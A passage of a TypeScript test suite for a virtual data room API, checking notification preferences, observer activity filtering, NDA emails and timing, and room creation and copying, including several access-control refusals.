// SPDX-License-Identifier: AGPL-3.0-only
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { appendEvent, sendNotification, type Channel, type OutgoingMessage } from '@vdrkit/core';
import { buildApp, DevHeaderAuthenticator } from '../src/index.js';
import { heron, T, type Heron } from '../../../packages/core/test/fixture.js';
import sharp from 'sharp';


let h: Heron;
let app: FastifyInstance;
let outbox: OutgoingMessage[];
let clock: Date;
const mailer: Channel = { name: 'email', send: async (m) => { outbox.push(m); return { status: 'accepted', providerMessageId: `pm-${outbox.length}` }; } };

beforeEach(async () => {
  h = await heron();
  outbox = [];
  clock = T.at;
  app = await buildApp({ db: h.db, auth: new DevHeaderAuthenticator(), dbRole: 'vdrkit_app', now: () => clock, mailer, publicUrl: 'https://dataroom.example' });
});
afterEach(async () => { await app.close(); await h.pg.close(); });

const as = (person: string, extra: Record<string, string> = {}) => ({ 'x-dev-person': person, 'x-dev-tenant': h.t1, ...extra });
const call = (method: 'GET' | 'POST' | 'PUT' | 'PATCH', url: string, person: string, payload?: unknown, extra: Record<string, string> = {}) =>
  app.inject({ method, url, headers: as(person, extra), ...(payload !== undefined ? { payload } : {}) });
const W = () => `/v1/workspaces/${h.ws}`;
const later = (minutes: number) => new Date(T.at.getTime() + minutes * 60_000);
const actions = async (ws: string) => (await h.pg.query<{ action: string }>(`select action from event where workspace_id = $1 order by seq`, [ws])).rows.map((r) => r.action);
const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';
const canCreate = (p: string) => h.pg.query(`update person set can_create_rooms = true where id = $1`, [p]);

describe('my notifications', () => {
  const mine = async (person: string) => (await call('GET', `${W()}/me/notifications`, person)).json();
  const event = (body: any, key: string) => body.events.find((e: any) => e.key === key);

  it('lists events with room defaults', async () => {
    const jan = await mine(h.person.jan);
    expect(jan.events.map((e: any) => e.key)).toEqual(['documents', 'versions', 'access', 'deadlines', 'agreements']);
    expect(event(jan, 'documents')).toMatchObject({ label: 'New documents', enabled: true, frequency: 'bundled', mandatory: false, locked: false,
      personal: false, roomDefault: { enabled: true, frequency: 'bundled' }, allowedFrequencies: ['immediate', 'bundled', 'digest'], canSwitchOff: true });
    expect(jan).toMatchObject({ isRoomAdmin: false, timeZone: 'UTC', timing: { bundleQuietMinutes: 10, bundleMaxMinutes: 60, summaryTimes: ['08:00'] } });
    const anika = await mine(h.person.anika);
    expect(anika.events.map((e: any) => e.key)).toEqual(expect.arrayContaining(['requests', 'drafts', 'processing_failed']));
  });

  it('treats subgroup leads as members', async () => {
    await h.pg.query(`update membership set role = 'lead' where person_id = $1 and group_id = $2`, [h.person.lars, h.group.aFin]);
    expect((await mine(h.person.lars)).events.map((e: any) => e.key)).not.toContain('requests');
  });

  it('reports the group setting as the room default', async () => {
    await h.pg.query(`insert into notification_policy (tenant_id, workspace_id, scope, group_id, category, enabled, mode)
                      values ($1, $2, 'group', $3, 'documents', true, 'digest')`, [h.t1, h.ws, h.group.a]);
    expect(event(await mine(h.person.jan), 'documents')).toMatchObject({ frequency: 'digest', personal: false, roomDefault: { enabled: true, frequency: 'digest' } });
    await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { documents: { frequency: 'immediate' } } });
    expect(event(await mine(h.person.jan), 'documents')).toMatchObject({ frequency: 'immediate', personal: true, roomDefault: { frequency: 'digest' } });
    await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { documents: null } });
    expect(event(await mine(h.person.jan), 'documents')).toMatchObject({ frequency: 'digest', personal: false });
    expect(event(await mine(h.person.anika), 'documents')).toMatchObject({ roomDefault: { enabled: true, frequency: 'bundled' } });
  });

  it('words colleague requests for the reader', async () => {
    await h.pg.query(`update membership set role = 'lead' where person_id = $1`, [h.person.jan]);
    const jan = await mine(h.person.jan);
    expect(event(jan, 'requests')).toMatchObject({ label: 'Your requests to add a colleague', description: 'When the room admin decides' });
    expect(event(await mine(h.person.anika), 'requests')).toMatchObject({ label: 'Requests to add a colleague', description: 'A lead asks to add someone' });
    expect(event(await mine(h.person.mei), 'requests')).toBeUndefined();
  });

  it('saves on/off and frequency separately', async () => {
    const res = await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { documents: { enabled: false }, versions: { frequency: 'digest' } } });
    expect(res.statusCode).toBe(200);
    expect(event(res.json(), 'documents')).toMatchObject({ enabled: false, frequency: 'bundled', personal: true });
    expect(event(res.json(), 'versions')).toMatchObject({ enabled: true, frequency: 'digest', personal: true });
    expect(event((await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { documents: { enabled: true } } })).json(), 'documents'))
      .toMatchObject({ enabled: true, frequency: 'bundled' });
    const back = (await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { versions: null } })).json();
    expect(event(back, 'versions')).toMatchObject({ enabled: true, frequency: 'bundled', personal: false });
    const logged = (await h.pg.query<any>(`select data from event where action = 'notification.preferences_changed' order by seq`)).rows;
    expect(logged).toHaveLength(3);
    expect(logged[0].data).toMatchObject({ person_id: h.person.jan, changes: { documents: { before: { enabled: true }, after: { enabled: false } } } });
  });

  it('keeps settings per room', async () => {
    await canCreate(h.person.anika);
    const other = (await call('POST', '/v1/workspaces', h.person.anika, { name: 'Project Osprey' })).json().id;
    await call('PUT', `${W()}/me/notifications`, h.person.anika, { events: { drafts: { frequency: 'immediate' } } });
    expect(event((await call('GET', `/v1/workspaces/${other}/me/notifications`, h.person.anika)).json(), 'drafts')).toMatchObject({ frequency: 'digest', personal: false });
  });

  it('should refuse to switch off mandatory events', async () => {
    await call('PATCH', `${W()}/settings`, h.person.anika, { notifications: { documents: { mode: 'immediate', mandatory: true } } });
    const jan = await mine(h.person.jan);
    expect(event(jan, 'documents')).toMatchObject({ mandatory: true, locked: true, canSwitchOff: false, frequency: 'immediate' });
    const off = await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { documents: { enabled: false } } });
    expect(off.statusCode).toBe(403);
    expect(off.json()).toMatchObject({ reason: 'mandatory_event', detail: 'New documents is mandatory in this room. You can choose how often, but not switch it off.' });
    expect((await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { documents: { frequency: 'digest' } } })).statusCode).toBe(200);
    await h.pg.query(`update notification_policy set enabled = false where scope = 'user' and person_id = $1`, [h.person.jan]);
    expect(event(await mine(h.person.jan), 'documents')).toMatchObject({ enabled: true, frequency: 'digest' });
  });

  it('lets room admins switch off mandatory events', async () => {
    await call('PATCH', `${W()}/settings`, h.person.anika, { notifications: { documents: { mode: 'immediate', mandatory: true } } });
    const res = await call('PUT', `${W()}/me/notifications`, h.person.anika, { events: { documents: { enabled: false } } });
    expect(res.statusCode).toBe(200);
    expect(event(res.json(), 'documents')).toMatchObject({ mandatory: true, locked: false, enabled: false });
  });

  it('lets room admins do so even without Off', async () => {
    await call('PATCH', `${W()}/settings`, h.person.anika, { notifications: { agreements: { mode: 'immediate', mandatory: true, allowedModes: ['immediate', 'bundled'] } } });
    expect(event(await mine(h.person.anika), 'agreements')).toMatchObject({ canSwitchOff: true, locked: false });
    const res = await call('PUT', `${W()}/me/notifications`, h.person.anika, { events: { agreements: { enabled: false } } });
    expect(res.statusCode).toBe(200);
    expect(event(res.json(), 'agreements')).toMatchObject({ enabled: false, mandatory: true });
    expect((await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { agreements: { enabled: false } } })).json().reason).toBe('mandatory_event');
  });

  it('should stay within allowed frequencies', async () => {
    await call('PATCH', `${W()}/settings`, h.person.anika, { notifications: { deadlines: { mode: 'immediate', allowedModes: ['immediate', 'digest'] } } });
    const res = await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { deadlines: { frequency: 'bundled' } } });
    expect(res.statusCode).toBe(400);
    expect(res.json().detail).toContain('does not allow "bundled" for Timeline changes');
    expect((await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { deadlines: { enabled: false } } })).json().reason).toBe('not_allowed_by_room');
    expect((await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { nonsense: { enabled: false } } })).statusCode).toBe(400);
    expect((await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { drafts: { enabled: false } } })).json().detail)
      .toBe('"Drafts waiting" does not apply to you in this room.');
  });

  it('404s outside the room', async () => {
    await canCreate(h.person.anika);
    const other = (await call('POST', '/v1/workspaces', h.person.anika, { name: 'Project Osprey' })).json().id;
    expect((await call('GET', `/v1/workspaces/${other}/me/notifications`, h.person.jan)).statusCode).toBe(404);
    expect((await call('PUT', `/v1/workspaces/${other}/me/notifications`, h.person.jan, { events: {} })).statusCode).toBe(404);
    const agent = await call('PUT', `${W()}/me/notifications`, h.person.jan, { events: { documents: { enabled: false } } }, { 'x-dev-agent-max-level': '20' });
    expect(agent.statusCode).toBe(403);
  });
});

describe('room notification settings', () => {
  it('lists events and timing', async () => {
    const s = (await call('GET', `${W()}/settings`, h.person.anika)).json();
    expect(Object.keys(s.notifications)).toEqual(['documents', 'versions', 'access', 'deadlines', 'agreements', 'requests', 'drafts', 'processing_failed', 'publish_dropped']);
    expect(s.notifications.drafts).toEqual({ label: 'Drafts waiting', enabled: true, mode: 'digest', mandatory: false, allowedModes: null, digestTimes: null });
    expect(s.notificationTiming).toEqual({ bundleQuietMinutes: 10, bundleMaxMinutes: 60, summaryTimes: ['08:00'] });
  });

  it('saves defaults and timing', async () => {
    const res = await call('PATCH', `${W()}/settings`, h.person.anika, {
      notifications: { versions: { enabled: false, mode: 'digest' }, access: { mode: 'immediate', mandatory: true } },
      notificationTiming: { bundleQuietMinutes: 5, bundleMaxMinutes: 30, summaryTimes: ['17:00', '08:00'] },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json().notifications.versions).toMatchObject({ enabled: false, mode: 'digest', mandatory: false });
    expect(res.json().notifications.access).toMatchObject({ enabled: true, mandatory: true });
    expect(res.json().notificationTiming).toEqual({ bundleQuietMinutes: 5, bundleMaxMinutes: 30, summaryTimes: ['08:00', '17:00'] });
    const jan = (await call('GET', `${W()}/me/notifications`, h.person.jan)).json();
    expect(jan.timing.summaryTimes).toEqual(['08:00', '17:00']);
    expect(jan.events.find((e: any) => e.key === 'versions')).toMatchObject({ enabled: false, roomDefault: { enabled: false, frequency: 'digest' } });
    expect(await actions(h.ws)).toContain('workspace.settings_changed');
  });

  it('rejects impossible settings', async () => {
    const bad = async (body: unknown) => { const r = await call('PATCH', `${W()}/settings`, h.person.anika, body); expect(r.statusCode).toBe(400); return r.json().detail; };
    expect(await bad({ notifications: { documents: { mode: 'bundled', mandatory: true, enabled: false } } }))
      .toBe('New documents cannot be mandatory and off by default. A mandatory event is always on.');
    expect(await bad({ notificationTiming: { bundleQuietMinutes: 30, bundleMaxMinutes: 20 } })).toContain('cannot wait longer for quiet');
    expect(await bad({ notificationTiming: { summaryTimes: ['08:00', '08:00'] } })).toBe('Choose two different summary times, or only one.');
    expect(await bad({ notifications: { coffee: { mode: 'bundled' } } })).toContain('There is no event called "coffee"');
    expect((await call('PATCH', `${W()}/settings`, h.person.anika, { notifications: { documents: { mode: 'off' } } })).statusCode).toBe(400);
  });
});

describe('activity for seller observers', () => {
  async function observer(person: string, partyId = h.party.seller) {
    const res = await call('POST', `${W()}/groups`, h.person.anika, { name: 'Heron board', partyId, roleTemplate: 'observer' });
    if (res.statusCode !== 201) return res;
    await h.pg.query(`insert into membership (tenant_id, person_id, group_id) values ($1, $2, $3)`, [h.t1, person, res.json().id]);
    return res;
  }

  it('should not let observers export', async () => {
    const obs = await h.pg.query<{ id: string }>(`insert into person (tenant_id, name, email) values ($1, 'Thandi Board', 'thandi@drosvelt.example') returning id`, [h.t1]);
    const thandi = obs.rows[0]!.id;
    expect((await observer(thandi)).statusCode).toBe(201);
    expect((await call('GET', `${W()}/events`, thandi)).statusCode).toBe(200);
    expect((await call('GET', `${W()}/events/verify`, thandi)).json()).toMatchObject({ intact: true });
    const csv = await call('GET', `${W()}/events/export.csv`, thandi);
    expect(csv.statusCode).toBe(403);
    expect(csv.json().reason).toBe('not_room_admin');
  });

  it('refuses everyone else', async () => {
    for (const p of [h.person.jan, h.person.maria]) {
      const r = await call('GET', `${W()}/events`, p);
      expect([r.statusCode, r.json().reason]).toEqual([403, 'not_activity_reader']);
    }
    expect((await call('GET', `${W()}/events`, h.person.anika, undefined, { 'x-dev-agent-max-level': '60' })).statusCode).toBe(403);
  });

  it('needs an active seller-side group', async () => {
    const r = await observer(h.person.jan, h.party.bidderA);
    expect([r.statusCode, r.json().detail]).toEqual([400, 'Observer groups belong to the seller side. Choose the seller party.']);
    const g = await h.pg.query<{ id: string }>(`insert into groups (tenant_id, workspace_id, party_id, name, role_template) values ($1, $2, $3, 'Fake', 'observer') returning id`,
      [h.t1, h.ws, h.party.bidderA]);
    await h.pg.query(`insert into membership (tenant_id, person_id, group_id) values ($1, $2, $3)`, [h.t1, h.person.jan, g.rows[0]!.id]);
    expect((await call('GET', `${W()}/events`, h.person.jan)).statusCode).toBe(403);
    const ok = await observer(h.person.maria);
    expect((await call('GET', `${W()}/events`, h.person.maria)).statusCode).toBe(200);
    await call('POST', `${W()}/groups/${ok.json().id}/revoke`, h.person.anika);
    clock = later(1);
    expect((await call('GET', `${W()}/events`, h.person.maria)).statusCode).toBe(403);
  });
});

describe('activity filtering for observers', () => {
  it('hides unseen nodes', async () => {
    const thandi = (await h.pg.query<{ id: string }>(`insert into person (tenant_id, name, email) values ($1, 'Thandi Board', 'thandi@drosvelt.example') returning id`, [h.t1])).rows[0]!.id;
    const board = (await call('POST', `${W()}/groups`, h.person.anika, { name: 'Heron board', partyId: h.party.seller, roleTemplate: 'observer' })).json().id;
    await h.pg.query(`insert into membership (tenant_id, person_id, group_id) values ($1, $2, $3)`, [h.t1, thandi, board]);
    expect((await call('PUT', `${W()}/grants`, h.person.anika, { changes: [{ nodeId: h.node.fin, groupId: board, level: 20 }] })).statusCode).toBe(200);
    const bidderDate = (await call('POST', `${W()}/milestones`, h.person.anika, { title: 'Bidder A management meeting', dueAt: '2026-11-20T10:00:00Z', visibleToGroupIds: [h.group.a] })).json().id;
    const openDate = (await call('POST', `${W()}/milestones`, h.person.anika, { title: 'First-round bids', dueAt: '2026-11-27T17:00:00Z', visibleToGroupIds: [] })).json().id;
    await h.app(async (tx) => {
      const ev = (action: string, resourceType: string, resourceId: string, data: Record<string, unknown> = {}) =>
        appendEvent(tx, { action, workspaceId: h.ws, resourceType, resourceId, data, occurredAt: T.at });
      await ev('node.renamed', 'node', h.node.it);                 // no access
      await ev('document.uploaded', 'node', h.node.audDraft);      // draft: hidden
      await ev('document.published', 'node', h.node.aud1);         // visible
      await ev('upload.started', 'upload_session', h.node.it, { path: '9.2 Redundancy list - Q4.xlsx' });
    });
    const read = async (person: string) => (await call('GET', `${W()}/events?limit=500`, person)).json().items as any[];
    const seen = await read(thandi);
    const ids = seen.map((e) => e.resourceId);
    expect(ids).toContain(h.node.aud1);
    expect(ids).toContain(openDate);
    expect(ids).toContain(bidderDate);
    expect(JSON.stringify(seen)).not.toContain(h.group.a);
    for (const hidden of [h.node.it, h.node.audDraft]) expect(ids).not.toContain(hidden);
    expect(seen.some((e) => e.resourceType === 'upload_session')).toBe(false);
    expect(JSON.stringify(seen)).not.toContain('Redundancy');
    const all = (await read(h.person.anika)).map((e) => e.resourceId);
    expect(all).toEqual(expect.arrayContaining([h.node.it, h.node.audDraft, h.node.aud1, bidderDate, openDate]));
  });

  it('hides people and sign-ins', async () => {
    const thandi = (await h.pg.query<{ id: string }>(`insert into person (tenant_id, name, email) values ($1, 'Thandi Board', 'thandi@drosvelt.example') returning id`, [h.t1])).rows[0]!.id;
    const board = (await call('POST', `${W()}/groups`, h.person.anika, { name: 'Heron board', partyId: h.party.seller, roleTemplate: 'observer' })).json().id;
    await h.pg.query(`insert into membership (tenant_id, person_id, group_id) values ($1, $2, $3)`, [h.t1, thandi, board]);
    const elsewhere = '00000000-0000-4000-8000-0000000000aa';
    await h.app(async (tx) => {
      const ev = (action: string, resourceType: string | undefined, resourceId: string | undefined, data: Record<string, unknown> = {}) =>
        appendEvent(tx, { action, workspaceId: h.ws, resourceType, resourceId, data, occurredAt: T.at });
      await ev('person.details_changed', 'person', h.person.jan, { fields: ['company'] });
      await ev('auth.two_factor_reset', 'person', h.person.jan, { person_id: h.person.jan, reset_in_workspace_id: elsewhere });
      await ev('invitation.created', 'invitation', h.person.mei);
      await ev('membership.ended', 'membership', h.person.mei);
      await ev('notification.sent', 'notification', h.person.jan, { recipient_person_id: h.person.jan });
      await ev('something.new', 'future_kind', h.person.jan);
      await ev('no.resource', undefined, undefined, { note: 'unscoped' });
      await ev('workspace.state_changed', 'workspace', h.ws, { to: 'open' });
    });
    const seen = (await call('GET', `${W()}/events?limit=500`, thandi)).json().items as any[];
    const actions = seen.map((e) => e.action);
    expect(actions).toContain('workspace.state_changed');
    for (const a of ['person.details_changed', 'auth.two_factor_reset', 'invitation.created', 'membership.ended', 'notification.sent', 'something.new', 'no.resource']) {
      expect(actions).not.toContain(a);
    }
    expect(JSON.stringify(seen)).not.toContain(elsewhere);
    const all = ((await call('GET', `${W()}/events?limit=500`, h.person.anika)).json().items as any[]).map((e) => e.action);
    expect(all).toEqual(expect.arrayContaining(['person.details_changed', 'auth.two_factor_reset', 'notification.sent', 'something.new']));
  });
});

describe('timeline and NDA emails', () => {
  const sendFor = async (person: string, category: string, at: Date) => {
    const n = (await h.pg.query<{ id: string }>(`select id from notification where person_id = $1 and category = $2 and status = 'open'`, [person, category])).rows;
    expect(n).toHaveLength(1);
    return h.app((tx) => sendNotification(tx, n[0]!.id, mailer, at));
  };

  it("uses the person's time zone for dates", async () => {
    await h.pg.query(`update person set time_zone = 'Europe/London' where id = $1`, [h.person.jan]);
    await call('POST', `${W()}/milestones`, h.person.anika, { title: 'First-round bids', dueAt: '2026-11-27T17:00:00Z', visibleToGroupIds: [] });
    expect((await sendFor(h.person.jan, 'deadlines', later(1))).status).toBe('sent');
    expect(outbox.at(-1)).toMatchObject({ to: 'jan@bidder-a.example', subject: 'Project Heron: a date changed on the Timeline',
      lines: ['First-round bids: Fri 27 Nov, 17:00 GMT'] });
  });

  it('drops hidden dates', async () => {
    const id = (await call('POST', `${W()}/milestones`, h.person.anika, { title: 'Site visit', dueAt: '2026-11-25T09:00:00Z', visibleToGroupIds: [] })).json().id;
    // narrowed and renamed in one change
    await call('PATCH', `${W()}/milestones/${id}`, h.person.anika, { title: 'Site visit Bidder B', dueAt: '2026-11-26T09:00:00Z', visibleToGroupIds: [h.group.b] });
    const r = await sendFor(h.person.jan, 'deadlines', later(1));
    expect(r).toMatchObject({ status: 'sent', itemsSent: 1, itemsDropped: 1 });
    expect(outbox.at(-1)!.lines).toEqual(['Site visit: removed from your Timeline']);
    expect(JSON.stringify(outbox.at(-1))).not.toMatch(/Bidder B|26 Nov/);
  });

  it('asks the person to accept a new NDA', async () => {
    await call('PUT', `${W()}/nda`, h.person.anika, { body: 'Confidentiality undertaking, version 2, with a non-solicit clause.' });
    expect((await sendFor(h.person.jan, 'agreements', later(1))).status).toBe('sent');
    expect(outbox.at(-1)).toMatchObject({ subject: 'Project Heron: a new NDA to accept',
      lines: ['A new version of the non-disclosure agreement was published. Sign in to read it; you accept it before you see documents again.'] });
  });
});

describe('NDA timing', () => {
  it('handles a lagging API clock', async () => {
    expect((await call('PUT', `${W()}/grants`, h.person.anika, { changes: [{ nodeId: h.node.fin, groupId: h.group.a, level: 20 }] })).statusCode).toBe(200);
    await h.pin(later(1));   // the database is a minute ahead of the API
    const v2 = (await call('PUT', `${W()}/nda`, h.person.anika, { body: 'Confidentiality undertaking, version 2, with a non-solicit clause.' })).json();
    const nda = (await call('GET', `${W()}/nda`, h.person.jan)).json();
    expect(nda).toMatchObject({ versionId: v2.versionId, versionNo: 2, acceptedAt: null });
    const blocked = await call('GET', `${W()}/dashboard`, h.person.jan);
    expect([blocked.statusCode, blocked.json().reason]).toEqual([403, 'nda_not_accepted']);
    expect((await call('GET', `${W()}/nodes`, h.person.jan)).json().items).toEqual([]);
    expect((await call('POST', `${W()}/nda/accept`, h.person.jan, { versionId: v2.versionId })).statusCode).toBe(200);
    expect((await call('GET', `${W()}/dashboard`, h.person.jan)).statusCode).toBe(200);
    expect((await call('GET', `${W()}/nodes`, h.person.jan)).json().items.map((n: any) => n.name)).toEqual(['Finance']);
  });
});

describe('creating a room', () => {
  beforeEach(async () => { await canCreate(h.person.anika); });
  const create = (body: unknown, person = h.person.anika) => call('POST', '/v1/workspaces', person, body);
  const tree = async (ws: string) => (await h.pg.query<{ ix: string; name: string; state: string }>(
    `select index_number as ix, name, state from node where workspace_id = $1 order by string_to_array(index_number, '.')::int[]`, [ws])).rows;

  it('starts from the standard index as drafts', async () => {
    const res = await create({ name: 'Project Ibis', seller: 'Ibis Packaging (Pty) Ltd', timeZone: 'Africa/Johannesburg', start: 'standard' });
    expect(res.statusCode).toBe(201);
    const id = res.json().id;
    expect(res.json()).toMatchObject({ folders: 51, copied: null, invitedAdmins: [] });
    const t = await tree(id);
    expect(t.filter((n) => !n.ix.includes('.')).map((n) => `${n.ix} ${n.name}`)).toEqual([
      '1 Corporate', '2 Legal', '3 Finance', '4 Commercial', '5 HR', '6 IT', '7 Property', '8 Insurance', '9 Environmental',
      '10 Intellectual property', '11 Data protection']);
    expect(t.filter((n) => n.ix.includes('.'))).toHaveLength(40);
    expect(t.find((n) => n.ix === '2.4')!.name).toBe('Material contracts');
    expect(new Set(t.map((n) => n.state))).toEqual(new Set(['draft']));
    const top = (await call('GET', `/v1/workspaces/${id}/nodes`, h.person.anika)).json().items;
    expect(top[0].access.allowed).toContain('manage');
    const room = (await h.pg.query<any>(`select w.state, w.time_zone, p.name as seller from workspace w join party p on p.workspace_id = w.id where w.id = $1`, [id])).rows[0];
    expect(room).toEqual({ state: 'preparing', time_zone: 'Africa/Johannesburg', seller: 'Ibis Packaging (Pty) Ltd' });
    const created = (await h.pg.query<any>(`select data from event where workspace_id = $1 and action = 'workspace.created'`, [id])).rows[0].data;
    expect(created).toMatchObject({ start: 'standard', folders: 51, time_zone: 'Africa/Johannesburg' });
  });

  it('rejects duplicate names', async () => {
    const check = (name: string, person = h.person.anika) => call('GET', `/v1/workspaces/name-check?name=${encodeURIComponent(name)}`, person);
    expect((await check('  project   HERON ')).json()).toEqual({ available: false });
    expect((await check('Project Ibis')).json()).toEqual({ available: true });
    expect((await check('Project Ibis', h.person.jan)).statusCode).toBe(404);
    const dup = await create({ name: 'project heron' });
    expect([dup.statusCode, dup.json().detail]).toEqual([409, 'You already have a room called project heron. Choose another name.']);
  });

  it("only compares with the caller's own rooms", async () => {
    const chris = (await h.pg.query<{ id: string }>(`insert into person (tenant_id, name, email, can_create_rooms) values ($1, 'Chris Other', 'chris@otherfirm.example', true) returning id`, [h.t1])).rows[0]!.id;
    const check = (name: string, person: string) => call('GET', `/v1/workspaces/name-check?name=${encodeURIComponent(name)}`, person);
    expect((await check('Project Heron', chris)).json()).toEqual({ available: true });
    expect((await create({ name: 'Project Heron' }, chris)).statusCode).toBe(201);
    expect((await check('project heron', chris)).json()).toEqual({ available: false });
    expect((await check('Project Heron', h.person.anika)).json()).toEqual({ available: false });
    await h.pg.query(`update membership set valid_to = $2 where person_id = $1`, [h.person.anika, T.at.toISOString()]);
    expect((await check('Project Heron', h.person.anika)).json()).toEqual({ available: true });
  });

  it('checks renames too', async () => {
    const osprey = (await create({ name: 'Project Osprey' })).json().id;
    const rename = (name: string) => call('PATCH', `/v1/workspaces/${osprey}/settings`, h.person.anika, { name });
    const dup = await rename('project heron ');
    expect([dup.statusCode, dup.json().detail]).toEqual([409, 'You already have a room called project heron. Choose another name.']);
    expect((await h.pg.query<any>(`select name from workspace where id = $1`, [osprey])).rows[0].name).toBe('Project Osprey');
    expect((await rename('PROJECT OSPREY')).statusCode).toBe(200);
    expect((await rename('Project Kestrel')).json().name).toBe('Project Kestrel');
  });

  it('returns 404 for a room you do not run', async () => {
    await canCreate(h.person.jan);
    const notMine = await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: h.ws } }, h.person.jan);
    const missing = await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: '00000000-0000-4000-8000-000000000000' } }, h.person.jan);
    expect([notMine.statusCode, missing.statusCode]).toEqual([404, 404]);
    expect(notMine.body).toBe(missing.body);
  });

  it('returns 404 for a deleted room', async () => {
    const missing = await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: '00000000-0000-4000-8000-000000000000' } });
    await h.pg.query(`update workspace set state = 'deleted' where id = $1`, [h.ws]);
    const deleted = await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: h.ws } });
    expect([deleted.statusCode, deleted.body]).toEqual([404, missing.body]);
  });

  it('copies only the chosen settings', async () => {
    await call('PATCH', `${W()}/settings`, h.person.anika, { watermark: { ip: true }, fourEyesPublish: true,
      notifications: { documents: { mode: 'immediate', mandatory: true } }, notificationTiming: { summaryTimes: ['07:00'] } });
    await h.pg.query(`update workspace set metadata = metadata || '{"invitation": {"subject": "Heron: your invitation", "lead_paragraph": "As lead of {group}, you add colleagues."}}' where id = $1`, [h.ws]);
    await call('PUT', `${W()}/grants`, h.person.anika, { changes: [{ nodeId: h.node.fin, groupId: h.group.a, level: 20 }] });
    const res = await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: h.ws, sellerGroups: true } });
    expect(res.statusCode).toBe(201);
    const id = res.json().id;
    expect(res.json().copied).toEqual({ folders: 4, sellerGroups: 1, grants: 1, settings: true, nda: true, invitationEmail: true });
    expect((await tree(id)).map((n) => `${n.ix} ${n.name}`)).toEqual(['3 Finance', '3.2 Audited financials', '3.4 Tax', '6 IT']);
    expect((await h.pg.query(`select 1 from node where workspace_id = $1 and kind = 'document'`, [id])).rows).toHaveLength(0);
    const groups = (await h.pg.query<any>(`select g.name, p.kind from groups g join party p on p.id = g.party_id where g.workspace_id = $1 order by g.name`, [id])).rows;
    expect(groups).toEqual([{ name: 'Room admins', kind: 'seller' }, { name: 'Seller finance team', kind: 'seller' }]);
    const members = (await h.pg.query<any>(`select m.person_id from membership m join groups g on g.id = m.group_id where g.workspace_id = $1`, [id])).rows;
    expect(members).toEqual([{ person_id: h.person.anika }]);
    const s = (await call('GET', `/v1/workspaces/${id}/settings`, h.person.anika)).json();
    expect(s).toMatchObject({ watermark: { ip: true }, fourEyesPublish: true, requiresNda: true, state: 'preparing',
      notifications: { documents: { mode: 'immediate', mandatory: true } }, notificationTiming: { summaryTimes: ['07:00'] } });
    const nda = (await call('GET', `/v1/workspaces/${id}/nda`, h.person.anika)).json();
    expect(nda).toMatchObject({ versionNo: 1, body: 'Confidentiality undertaking, version 1' });
    expect((await h.pg.query<any>(`select metadata -> 'invitation' as inv from workspace where id = $1`, [id])).rows[0].inv)
      .toEqual({ subject: 'Heron: your invitation', lead_paragraph: 'As lead of {group}, you add colleagues.' });
    const grant = (await h.pg.query<any>(`select ag.level, ag.can_upload from access_grant ag join groups g on g.id = ag.subject_group_id
      where ag.workspace_id = $1 and g.name = 'Seller finance team' and ag.superseded_at = 'infinity'`, [id])).rows;
    expect(grant).toEqual([{ level: 20, can_upload: true }]);
    expect(await actions(id)).toEqual(expect.arrayContaining(['workspace.created', 'grant.changed']));
    expect((await h.pg.query<any>(`select data from event where workspace_id = $1 and action = 'workspace.copied'`, [h.ws])).rows[0].data)
      .toMatchObject({ to_workspace_id: id, person_id: h.person.anika });
  });

  it('copies sign-in settings with room settings', async () => {
    await h.pg.query(`update workspace set idle_sign_out_minutes = 30, require_two_factor = false, allow_trusted_browser = false,
                             trusted_browser_days = 7 where id = $1`, [h.ws]);
    const cols = `select idle_sign_out_minutes, require_two_factor, allow_trusted_browser, trusted_browser_days from workspace where id = $1`;
    const id = (await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: h.ws } })).json().id;
    expect((await h.pg.query<any>(cols, [id])).rows[0])
      .toEqual({ idle_sign_out_minutes: 30, require_two_factor: false, allow_trusted_browser: false, trusted_browser_days: 7 });
    const plain = (await create({ name: 'Project Kite', start: 'copy', copyFrom: { workspaceId: h.ws, settings: false } })).json().id;
    expect((await h.pg.query<any>(cols, [plain])).rows[0])
      .toEqual({ idle_sign_out_minutes: 240, require_two_factor: true, allow_trusted_browser: true, trusted_browser_days: 30 });
  });

  it('should copy nothing by default', async () => {
    const res = await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: h.ws, folders: false, settings: false, nda: false, invitationEmail: false } });
    expect(res.json().copied).toEqual({ folders: 0, sellerGroups: 0, grants: 0, settings: false, nda: false, invitationEmail: false });
    const id = res.json().id;
    expect(await tree(id)).toEqual([]);
    expect((await call('GET', `/v1/workspaces/${id}/settings`, h.person.anika)).json()).toMatchObject({ requiresNda: false, fourEyesPublish: false });
  });

  it('refuses to copy other rooms', async () => {
    await canCreate(h.person.maria);   // member, not admin
    const res = await create({ name: 'Project Osprey', start: 'copy', copyFrom: { workspaceId: h.ws } }, h.person.maria);
    expect(res.statusCode).toBe(404);
    expect((await h.pg.query(`select 1 from workspace where name = 'Project Osprey'`)).rows).toHaveLength(0);
  });

  it('invites other admins', async () => {
    const res = await create({ name: 'Project Osprey', start: 'empty', admins: [
      { email: 'Pieter.van.der.Merwe@otherfirm.example' }, { email: 'pieter.van.der.merwe@otherfirm.example' }, { email: 'anika@quillmont.example' }] });
    expect(res.statusCode).toBe(201);
    const id = res.json().id;
    expect(res.json().invitedAdmins).toEqual([{ email: 'pieter.van.der.merwe@otherfirm.example', personId: expect.any(String) }]);
